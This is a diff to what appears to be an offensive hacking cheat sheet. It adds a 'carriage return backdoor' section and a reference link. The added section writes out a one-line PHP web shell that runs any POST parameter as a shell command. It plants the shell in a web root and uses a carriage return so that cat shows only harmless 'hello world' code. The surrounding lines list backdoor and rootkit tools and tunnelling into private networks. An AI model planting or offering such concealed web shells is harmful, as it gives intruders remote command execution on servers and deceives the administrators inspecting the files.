@@ -53,6 +53,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
+   1. [Carriage return backdoor](#carriage-return-backdoor) 
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
@@ -1027,12 +1028,28 @@ gs-netcat -p 1080    # Your workstation.
 # Access route.local:22 on the Host's private LAN from your Workstation:
 socat -  "SOCKS4a:127.1:route.local:22"
 ```
+
 Read [Use any tool via Socks Proxy](#scan-proxy).
 
 Other methods:
 * [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
+<a id="carriage-return-backdoor"></a>
+**6.iv. Carriage Return Backdoor**
+
+This method allows to hide from cat the malicious content of a file with a simple carriage return character: 
+```sh
+bash$ echo -e "<?php if(isset(\$_POST[0])){\`\$_POST[0]\`;} ?>\r<?php echo \"hello world\"; echo \" this is a test\"; ?>" > /var/www/html/test.php
+bash$  cat test.php
+<?php echo "hello world"; echo " this is a test"; ?>
+bash$  php test.php
+hello world this is a test
+bash$ strings test.php
+<?php if(isset($_POST[0])){`$_POST[0]`;} ?>
+<?php echo "hello world"; echo " this is a test"; ?>
+bash$
+```
 ---
 <a id="shell-hacks"></a>
 ## 7. Shell Hacks
@@ -1368,7 +1385,8 @@ System Information Gathering
 Backdoors
 1. https://www.gsocket.io/deploy - The world's smallest backdoor
 1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
-1. https://www.kali.org/tools/weevely - PHP backdoor 
+1. https://www.kali.org/tools/weevely - PHP backdoor
+1. https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/ - Carriage Return backdoor
 
 Scanners
 1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
